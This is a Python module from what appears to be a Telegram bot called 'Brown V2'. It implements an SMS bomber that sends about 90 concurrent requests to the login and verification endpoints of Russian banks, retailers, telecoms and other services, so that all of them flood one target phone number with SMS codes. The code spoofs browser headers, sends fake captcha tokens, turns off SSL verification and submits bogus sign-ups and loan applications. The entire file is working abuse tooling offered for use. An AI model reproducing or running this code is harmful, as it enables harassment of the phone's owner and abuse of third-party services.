"""
Brown V2 | sms_snos.py
SMS флуд — все запросы параллельно через asyncio.gather
Эндпоинты: Beast Bomber (github.com/un1cum/Beast_Bomber)
"""

import asyncio
import os
import random
import string

import aiohttp
from utils import now_msk, esc_md

LOG_FOLDER = "logs"
os.makedirs(LOG_FOLDER, exist_ok=True)

TIMEOUT = 8

bot = None


def set_bot_sms(b):
    global bot
    bot = b


def _rand_email():
    chars = string.ascii_lowercase
    return f"{''.join(random.choices(chars, k=9))}@{esc_md(''.join(random.choices(chars, k=5)))}.ru"


async def _do_req(session: aiohttp.ClientSession, name: str, method: str, url: str, **kwargs) -> tuple:
    """Выполняет один HTTP запрос с таймаутом. Возвращает (name, icon, code)."""
    try:
        coro = session.request(method, url, **kwargs)
        resp = await asyncio.wait_for(coro, timeout=TIMEOUT)
        code = str(resp.status)
        icon = "✅" if resp.status in (200, 201, 202, 204, 400, 401) else "❌"
        print(f"[SMS] {name:30s} → {icon} {code}", flush=True)
        return (name, icon, code)
    except asyncio.TimeoutError:
        print(f"[SMS] {name:30s} → ⏱ TIMEOUT", flush=True)
        return (name, "⏱", "TIMEOUT")
    except Exception as e:
        short = str(e)[:35]
        print(f"[SMS] {name:30s} → ❌ {short}", flush=True)
        return (name, "❌", short)


def _build_tasks(session: aiohttp.ClientSession, phone: str) -> list:
    """Собирает список корутин для всех сервисов."""
    p = phone
    pp = "+" + phone
    email = _rand_email()
    user = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36"

    winelab = f'{p[1]}{p[2]}{p[3]}%20{p[4]}{p[5]}{p[6]}%20{p[7]}{p[8]}%20{p[9]}{p[10]}'
    profi_fmt = f'7 {p[1]}{p[2]}{p[3]}-{p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}'
    letu_fmt = f'+7 ({p[1]}{p[2]}{p[3]}) {p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}'
    growfood_fmt = f'{p[1]}{p[2]}{p[3]} {p[4]}{p[5]}{p[6]} {p[7]}{p[8]} {p[9]}{p[10]}'
    madyart_fmt = f'+7 ({p[1]}{p[2]}{p[3]}) {p[4]}{p[5]}{p[6]} - {p[7]}{p[8]} - {p[9]}{p[10]}'

    J = "application/json"
    F = "application/x-www-form-urlencoded"

    def r(name, method, url, **kw):
        return _do_req(session, name, method, url, **kw)

    return [
        # 1
        r("MTS Bank", "POST", "https://sso.mtsbank.ru/api/v2/login",
          json={"login": p}, headers={"Content-Type": J, "User-Agent": user, "Origin": "https://sso.mtsbank.ru"}),
        # 2
        r("Winelab", "GET", f"https://www.winelab.ru/confirmation/sendByPhone?number={winelab}",
          headers={"User-Agent": user, "Referer": "https://www.winelab.ru/", "X-Requested-With": "XMLHttpRequest"}),
        # 3
        r("Profi.ru", "POST", "https://spb.profi.ru/graphql",
          json={"query": "query authStrategyStart($type: AuthStrategyType!, $initialState: AuthStrategyInitialState!) { authStrategyStart(type: $type, initialState: $initialState) { strategy { strategyDescriptor } } }",
                "variables": {"type": "phone", "initialState": {"phoneNumber": profi_fmt, "defaultOrderCityId": "prfr", "currentHost": "https://profi.ru"}}},
          headers={"Content-Type": J, "User-Agent": user, "x-app-id": "PROFI", "x-new-auth-compatible": "1", "Origin": "https://profi.ru"}),
        # 4
        r("Читай-город", "POST", "https://web-gate.chitai-gorod.ru/api/v1/auth/code",
          json={"phone": p, "cgsing": {"type": "reCaptcha", "payload": {"token": "fake_token", "action": "getSMSCode", "version": "rv3"}}},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://www.chitai-gorod.ru"}),
        # 5
        r("VerifyKit", "POST", "https://widget.verifykit.com/v2.1/otp-start?token=dma6839823b8e9ceeb7ba5e4d7987db521f71d5f12ff44b2372da1deac246",
          data={"countryCode": "RU", "isMobileBrowser": "0", "phoneOperatingSystem": "android", "phoneNumber": pp},
          headers={"Content-Type": F, "User-Agent": user, "X-Requested-With": "XMLHttpRequest"}),
        # 6
        r("Sunlight", "POST", "https://api.sunlight.net/v3/customers/authorization/",
          json={"phone": pp, "flashcall": True},
          headers={"Content-Type": J, "User-Agent": user, "X-Requested-With": "SunlightFrontendApp"}),
        # 7
        r("Citilink", "POST", f"https://www.citilink.ru/registration/confirm/phone/{pp}/",
          headers={"User-Agent": user, "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}),
        # 8
        r("Raiffeisen #1", "POST", "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms",
          json={"number": p}, headers={"Content-Type": J, "User-Agent": user, "Origin": "https://www.raiffeisen.ru"}),
        # 9
        r("Raiffeisen #2", "POST", "https://oapi.raiffeisen.ru/api/sms-auth/public/v1.0/phone/code/sms",
          json={"number": p}, headers={"Content-Type": J, "User-Agent": user, "Referer": "https://www.raiffeisen.ru/"}),
        # 10
        r("Madyart", "POST", "https://madyart.ru/local/aut.php",
          data={"wct_reg_fio": "Пупкин", "wct_reg_fio2": "Василий", "wct_reg_phone": madyart_fmt,
                "wct_reg_ch": "Y", "wc_phone_psw": "sdfgwse5rgfdzvbsedf", "wc_phone_psw2": "sdfgwse5rgfdzvbsedf"},
          headers={"Content-Type": F, "User-Agent": user, "X-Requested-With": "XMLHttpRequest"}),
        # 11
        r("Growfood", "POST", "https://admin.growfood.pro/api/personal-cabinet/v2_0/authentication/send-sms",
          json={"analyticalData": {"cookie": {}, "utm": {}, "referrer": None, "host": "growfood.pro"},
                "client": {"phone": growfood_fmt, "cityId": 2}},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://growfood.pro"}),
        # 12
        r("Letu GET", "GET", f"https://www.letu.ru/s/api/user/account/v1/verifications/phone?pushSite=storeMobileRU&phone=%2B7+%28{p[1]}{p[2]}{p[3]}%29+{p[4]}{p[5]}{p[6]}-{p[7]}{p[8]}-{p[9]}{p[10]}",
          headers={"User-Agent": user, "Referer": "https://www.letu.ru/"}),
        # 13
        r("Letu POST", "POST", "https://www.letu.ru/s/api/user/account/v1/confirmations/phone?pushSite=storeMobileRU",
          json={"captcha": "", "phoneNumber": letu_fmt},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://www.letu.ru"}),
        # 14
        r("Evraz", "POST", "https://spb.evraz.market/bitrix/services/main/ajax.php?action=evraz%3Amain.api.auth.sendsms",
          data={"userPhone": letu_fmt, "captchaCode": "", "sessid": "ce46266c9ca3de6414e13d163615c827"},
          headers={"Content-Type": F, "User-Agent": user, "bx-ajax": "true"}),
        # 15
        r("ABC.ru", "POST", "https://abc.ru/clientapi/v1/user/phone-sms/",
          json={"phone": pp, "country_id": 1, "scenario": "registration", "_csrf": "oqqL7n8CPs"},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://abc.ru"}),
        # 16
        r("Mosmetro", "POST", "https://auth.mosmetro.ru/api/auth/login/sms",
          json={"login": p, "returnUrl": "/connect/authorize/callback"},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://auth.mosmetro.ru"}),
        # 17
        r("Uteka SPB", "POST", "https://spb.uteka.ru/rpc/?method=auth.GetCode",
          json={"jsonrpc": "2.0", "id": 8, "method": "auth.GetCode",
                "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
          headers={"Content-Type": J, "User-Agent": user}),
        # 18
        r("Uteka Krym", "POST", "https://krym.uteka.ru/rpc/?method=auth.GetCode",
          json={"jsonrpc": "2.0", "id": 6, "method": "auth.GetCode",
                "params": {"phone": p[1:], "mustExist": False, "sendRealSms": True}},
          headers={"Content-Type": J, "User-Agent": user}),
        # 19
        r("Elementaree", "POST", "https://api-new.elementaree.ru/graphql",
          json={"operationName": "phoneVerification", "variables": {"phone": p},
                "query": "mutation phoneVerification($phone: String!) { phoneVerification(phone: $phone) { success } }"},
          headers={"Content-Type": J, "User-Agent": user, "Authorization": "Bearer 5mV0xfl6pp5yCOKcwOTy1bY6-V8wPtwn"}),
        # 20
        r("Lenta Online", "POST", "https://moscow.online.lenta.com/jrpc",
          json={"method": "authCodeSend", "params": {"phone": p}, "jsonrpc": "2.0", "id": 12},
          headers={"Content-Type": J, "User-Agent": user, "x-domain": "moscow", "x-retail-brand": "lo"}),
        # 21
        r("Auchan", "GET", "https://www.auchan.ru/v1/cmd/clientprofile/checkphone",
          headers={"User-Agent": user, "phone": p, "source": "4"}),
        # 22
        r("Victoria Group", "POST", "https://lk.victoria-group.ru/identity/registration",
          json={"MobilePhone": pp, "CardNumber": None, "AgreeToTerms": 1, "AllowNotification": 0, "DeviceId": "gl3llll8mih00hxy1xg6j23c"},
          headers={"Content-Type": J, "User-Agent": user, "Origin": "https://lk.victoria-group.ru"}),
        # 23
        r("Svyaznoy #1", "POST", f"https://www.svyaznoy.ru/api/v2/sms-verification-code/{p[1:]}",
          headers={"User-Agent": user, "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}),
        # 24
        r("Svyaznoy #2", "POST", f"https://www.svyaznoy.ru/api/v2/sms-verification-code/{p[1:]}",
          headers={"User-Agent": user, "X-Requested-With": "XMLHttpRequest", "Content-Length": "0"}),
        # 25
        r("OneTwoTrip", "PATCH", "https://www.onetwotrip.com/_auth/profile/phone/with-confirm",
          json={"phone": pp, "reseller": ""},
          headers={"Content-Type": J, "User-Agent": user}),
        # 26
        r("Zdorov.ru", "POST", "https://zdorov.ru/backend/api/customer/confirm",
          json={"phone": p, "deviceId": "6adada4b-b83b-406a-ac5b-b6101d282cdc", "term": 2},
          headers={"Content-Type": J, "User-Agent": user}),
        # 27
        r("Sokolov", "POST", "https://sokolov.ru/api/v4/profile/user/send-code",
          json={"data": {"type": "login", "attributes": {"phone": p, "uid_captcha": None, "code_captcha": None}}},
          headers={"Content-Type": "application/vnd.api+json", "User-Agent": user}),
        # 28
        r("TSUM", "POST", "https://api.tsum.ru/v2/authorize/request-sms",
          json={"data": {"type": "requestSMS", "attributes": {"phone": pp}}},
          headers={"Content-Type": J, "User-Agent": user}),
        # 29
        r("Megafon.TV", "POST", "https://bmp.megafon.tv/api/v10/auth/register/msisdn",
          json={"msisdn": pp, "password": "200147200147"},
          headers={"Content-Type": J, "User-Agent": user}),
        # 30
        r("Auto.ru", "POST", "https://auth.auto.ru/-/ajax/auth/",
          json={"items": [{"path": "auth/login-or-register", "params": {"phone": p, "retpath": "https://auto.ru/"}}]},
          headers={"Content-Type": J, "User-Agent": user}),
        # 31
        r("ShoppingLive", "POST", "https://www.shoppinglive.ru/phone-verification/send-code",
          data={"mobilePhone": p[1:], "CSRFToken": "00bc3ff8-f081-483d-ab0e-bb026785114f"},
          headers={"Content-Type": F, "User-Agent": user}),
        # 32
        r("Leomax", "POST", "https://ap.leomax.ru/siteapi/auth/authcode",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 33
        r("Tele2", "POST", f"https://msk.tele2.ru/api/validation/number/{p}",
          json={"sender": "Tele2"},
          headers={"Content-Type": J, "User-Agent": user, "tele2-user-agent": "web"}),
        # 34
        r("ICQ", "POST", "https://u.icq.net/api/v89/rapi/auth/sendCode",
          json={"reqId": "85231-1668029727", "params": {"phone": p, "language": "ru-RU",
                "route": "sms", "devId": "ic1rtwz1s1Hj1O0r", "application": "icq"}},
          headers={"Content-Type": J, "User-Agent": user}),
        # 35
        r("Sravni.ru", "POST", "https://my.sravni.ru/signin/code",
          data={"__RequestVerificationToken": "CfDJ8GIymPxtm1FFmKVQVGA7i3c6GdbFf41S",
                "phone": pp, "returnUrl": "/user/profile"},
          headers={"Content-Type": F, "User-Agent": user}),
        # 36
        r("Vprok.ru", "POST", "https://www.vprok.ru/as_send_pin",
          data={"phone": p}, headers={"Content-Type": F, "User-Agent": user}),
        # 37
        r("Zaymigo", "POST", "https://borrow.zaymigo.com/rpc/v1",
          json={"jsonrpc": "2.0", "id": "15930021", "method": "create",
                "params": {"borrower": {"surname": "Пупкин", "name": "Василий",
                                        "patronymic": "Андреевич", "patronymicNotExists": False,
                                        "phone": pp, "email": email},
                           "term": 12, "amount": 10000,
                           "agreements": [{"name": "assignment_of_claims", "val": True}]}},
          headers={"Content-Type": J, "User-Agent": user}),
        # 38
        r("Adengi", "POST", "https://adengi.ru/rest/v1/registration/code/send",
          json={"email": email, "firstName": "Василий", "hash": "a6ac90134b55d015bd2731fd4e2f06d3",
                "lastName": "Пупин", "middleName": "Иванович", "phone": p,
                "timestamp": 1667680555, "via": "sms"},
          headers={"Content-Type": J, "User-Agent": user}),
        # 39
        r("B-Apteka", "POST", "https://b-apteka.ru/lk/send_confirm_code",
          json={"phone": p, "_token": "G342Mr1Pf7bDbpQ3qdqxByzuyjG08yHr8i9TbtpR"},
          headers={"Content-Type": J, "User-Agent": user}),
        # 40
        r("Wheely", "POST", "https://api.wheely.com/v6/auth/oauth/token",
          json={"app_id": "55e085968a5da59241000001", "phone": pp},
          headers={"Content-Type": J, "User-Agent": user}),
        # 41
        r("Fonbet", "POST", "https://clientsapi03w.bk6bba-resources.com/cps/superRegistration/createProcess",
          json={"birthday": "2000-10-25", "deviceId": "2340BBFFD39BD54C3A914A90D5582A63",
                "ecupis": True, "email": "", "lang": "ru", "password": "Hoho_HO123",
                "phoneNumber": pp, "sysId": 1, "webReferrer": "https://www.fon.bet/"},
          headers={"Content-Type": J, "User-Agent": user}),
        # 42
        r("Acuvue", "POST", "https://api.myacuvuepro.ru/myacuvue/oauth/mobile",
          json={"phoneNumber": p},
          headers={"Content-Type": J, "User-Agent": user,
                   "x-api-key": "XoA3wMy3d8LNGDToaWz1yQdjRiKcjLWu", "x-app-version": "PWA 2.3.1"}),
        # 43
        r("Smartseeds", "POST", "https://smartseeds.ru/api/native/v1.0/cargo-owner/validate",
          json={"profileDetails": {"individualTaxpayerNumber": "6163027810", "farmer": False},
                "contactFullName": "Бла бла", "email": email, "password": "testpassword1234", "phoneNumber": p},
          headers={"Content-Type": J, "User-Agent": user,
                   "Authorization": "Bearer ODFlODkwNjM4YTdmN2E0ZWM1Yjk4YWU1NGY2NDFiZTJiNDFhNDJlZTM1ZDY0NDc5MDYyN2QzYjdlNzI5ZGNhMw"}),
        # 44
        r("X5 GraphQL", "POST", "https://id.x5.ru/graphql",
          json={"query": f'{{ user_credentials(login:"{p}") {{login}}}}'},
          headers={"Content-Type": "text/plain;charset=UTF-8", "User-Agent": user}),
        # 45
        r("DNS", "POST", "https://www.dns-shop.ru/user/send-otp/",
          data=f"phone={pp}",
          headers={"Content-Type": F, "User-Agent": user, "X-Requested-With": "XMLHttpRequest"}),
        # 46
        r("OK.ru", "POST", "https://ok.ru/api/auth/login",
          data=f"phone={pp}", headers={"Content-Type": F, "User-Agent": user}),
        # 47
        r("Wildberries", "POST", "https://user-order.wildberries.ru/api/v2/auth/login",
          json={"phone": int(p), "deviceId": "wbreg" + p[:6]},
          headers={"Content-Type": J, "User-Agent": user}),
        # 48
        r("СберЗдоровье", "POST", "https://api.sberhealth.ru/auth/v1/send-otp",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 49
        r("Delivery Club", "POST", "https://api.delivery-club.ru/api11/auth",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user, "X-Version": "11.0.0"}),
        # 50
        r("Яндекс.Еда", "POST", "https://eda.yandex.ru/api/v1/auth/request-code",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 51
        r("Boxberry", "POST", "https://api.boxberry.ru/api/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 52
        r("Самокат", "POST", "https://api.samokat.ru/v1/auth/send-code",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 53
        r("ВкусВилл", "POST", "https://api.vkusvill.ru/api/v2/user/send-code",
          json={"phone": p}, headers={"Content-Type": J, "User-Agent": user}),
        # 54
        r("Авито", "POST", "https://api.avito.ru/core/v1/accounts/phone/login",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 55
        r("Lamoda", "POST", "https://api.lamoda.ru/api/v5/user/sendAuthCode",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 56
        r("Золотое Яблоко", "POST", "https://goldapple.ru/api/v1/auth/send-code",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 57
        r("Детский мир", "POST", "https://www.detmir.ru/api/v1/auth/phone/otp",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 58
        r("FixPrice", "POST", "https://fix-price.com/api/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 59
        r("Магнит", "POST", "https://magnit.ru/api/v2/auth/login/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 60
        r("М.Видео", "POST", "https://www.mvideo.ru/bff/mobile/auth/otp/send",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 61
        r("Перекрёсток", "POST", "https://www.perekrestok.ru/api/customer/v2/auth/phone",
          json={"phone": p}, headers={"Content-Type": J, "User-Agent": user}),
        # 62
        r("Пятёрочка", "POST", "https://www.pyaterochka.ru/api/customer/v2/auth/phone",
          json={"phone": p}, headers={"Content-Type": J, "User-Agent": user}),
        # 63
        r("Book24", "POST", "https://book24.ru/api/v1/auth/send-code/",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 64
        r("CIAN", "POST", "https://api.cian.ru/api/auth/v1/get-code-by-phone/",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 65
        r("Apteka.ru", "POST", "https://api.apteka.ru/Account/Phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 66
        r("Rendez-Vous", "POST", "https://rendez-vous.ru/api/v1/user/sms/auth",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 67
        r("РЖД", "POST", "https://lk.rzd.ru/api/v1/auth/phone/otp",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 68
        r("Туту.ру", "POST", "https://www.tutu.ru/api/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 69
        r("Яндекс.Путешествия", "POST", "https://travel.yandex.ru/api/v1/user/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 70
        r("Ростелеком", "POST", "https://lk.rt.ru/api/auth/v2/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 71
        r("2ГИС", "POST", "https://account.2gis.ru/v1/auth/phone/otp",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 72
        r("Леруа Мерлен", "POST", "https://leroymerlin.ru/api/v2/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 73
        r("Дом.ру", "POST", "https://dom.ru/api/v2/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 74
        r("СберМаркет", "POST", "https://sbermarket.ru/api/v3/auth/sms",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 75
        r("Hoff", "POST", "https://hoff.ru/api/v2/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 76
        r("ВсеИнструменты", "POST", "https://www.vseinstrumenti.ru/api/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 77
        r("Dodo Pizza", "POST", "https://auth.dodois.io/connect/token",
          data=f"grant_type=phone&phone={pp}&platform=web&countryCode=ru",
          headers={"Content-Type": F, "User-Agent": user}),
        # 78
        r("Burger King", "POST", "https://burgerking.ru/api/v1/sms/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 79
        r("Иви", "POST", "https://api.ivi.ru/mobileapi/user/auth/v7",
          json={"phone": pp, "type": "sms"}, headers={"Content-Type": J, "User-Agent": user}),
        # 80
        r("Okko", "POST", "https://okko.tv/api/v3/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 81
        r("More.tv", "POST", "https://more.tv/api/v4/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 82
        r("Кинопоиск", "POST", "https://api.kinopoisk.ru/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 83
        r("Skillbox", "POST", "https://skillbox.ru/api/v1/auth/phone/send-code",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 84
        r("Geekbrains", "POST", "https://gb.ru/api/v1/users/send_sms",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 85
        r("Медси", "POST", "https://medsi.ru/api/v1/auth/phone/sms",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 86
        r("Гемотест", "POST", "https://gemotest.ru/api/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 87
        r("INVITRO", "POST", "https://www.invitro.ru/api/v1/auth/otp",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 88
        r("СберПрайм", "POST", "https://sberprime.sber.ru/api/v1/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
        # 89
        r("HeadHunter", "POST", "https://hh.ru/oauth/token/phone",
          data=f"phone={pp}&client_id=HH&grant_type=phone_verification",
          headers={"Content-Type": F, "User-Agent": user}),
        # 90
        r("ДомКлик", "POST", "https://domclick.ru/api/v2/user/auth/phone",
          json={"phone": pp}, headers={"Content-Type": J, "User-Agent": user}),
    ]


async def main_sms_snos(phone: str, user_id: int, username: str, notify_bot=None):
    """
    phone — формат 79991234567 (без +)
    """
    _notify = notify_bot or bot
    from config import bot_logs
    import keyboards
    from aiogram import types as aiogram_types

    print(f"\n{'='*55}", flush=True)
    print(f"[SMS] 🚀 SMS-бомбер | +{phone} | {user_id} (*@{username}*)", flush=True)
    print(f"{'='*55}", flush=True)

    connector = aiohttp.TCPConnector(ssl=False, limit=100)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = _build_tasks(session, phone)
        results = await asyncio.gather(*tasks)

    results = list(results)
    ok = sum(1 for _, s, _ in results if s == "✅")
    timeout = sum(1 for _, s, _ in results if s == "⏱")
    err = sum(1 for _, s, _ in results if s == "❌")
    total = len(results)

    print(f"[SMS] Итого: ✅ {ok} | ⏱ {timeout} | ❌ {err}", flush=True)

    log_lines = [
        "Brown V2 | SMS-бомбер",
        "=" * 50,
        f"Пользователь : {user_id} (*@{username}*)",
        f"Номер        : +{phone}",
        f"Сервисов     : {total}",
        f"Дата         : {now_msk().strftime('%Y-%m-%d %H:%M:%S')}",
        "=" * 50, "",
    ]
    for name, icon, code in results:
        log_lines.append(f"{icon}  {name:35s} [{code}]")
    log_lines += ["", "=" * 50,
                  f"✅ Успешно : {ok}",
                  f"⏱ Таймаут : {timeout}",
                  f"❌ Ошибок  : {err}"]

    log_name = f"brown_v2_sms_{os.urandom(4).hex()}.txt"
    log_path = os.path.join(LOG_FOLDER, log_name)
    with open(log_path, "w", encoding="utf-8") as f:
        f.write("\n".join(log_lines))

    caption_user = (
        f"💬 *SMS-бомбер завершён!*\n"
        f"*└─ Номер:* +{phone}\n\n"
        f"*Сервисов:* {total}\n"
        f"✅ *Успешно: {ok}*\n"
        f"⏱ *Таймаут: {timeout}*\n"
        f"❌ *Ошибок: {err}*"
    )
    try:
        import db as _db_mod
        _is_hid = await _db_mod.get_is_hidden(user_id)
        _log_uid = "скрыт" if _is_hid else str(user_id)
        _log_uname = "скрыт" if _is_hid else username
    except Exception:
        _log_uid, _log_uname = str(user_id), username

    caption_log = (
        f"💬 *SMS-бомбер*\n"
        f"*└─ Номер:* +{phone}\n"
        f"✅ {ok} | ⏱ {timeout} | ❌ {err}\n"
        f"👤 {_log_uid} (*@{_log_uname}*)"
    )

    try:
        await _notify.send_document(
            user_id, aiogram_types.InputFile(log_path),
            caption=caption_user, parse_mode="Markdown",
            reply_markup=keyboards.main_menu,
        )
        await bot.send_document(
            bot_logs, aiogram_types.InputFile(log_path),
            caption=caption_log, parse_mode="Markdown",
        )
    except Exception as e:
        print(f"[SMS] Ошибка отправки лога: {e}", flush=True)

    try:
        os.remove(log_path)
    except Exception:
        pass
